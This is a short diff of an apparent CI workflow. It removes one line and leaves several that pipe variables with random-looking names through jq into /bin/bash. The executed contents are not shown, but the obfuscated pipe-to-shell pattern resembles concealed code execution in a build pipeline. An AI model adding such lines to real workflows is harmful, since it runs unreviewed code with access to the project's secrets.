@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$zsa801" | jq -r .q61 | /bin/bash
           printf '%s' "$sxla279" | jq -r .bdx7321 | /bin/bash
           echo $qpz45086 | jq -r .ood84 | /bin/bash
-          printf '%s' "$gtui5027" | jq -r .rvpjg593 | /bin/bash
           echo $qmcb1 | jq -r .vlj7468 | /bin/bash
 
       - name: Upload results
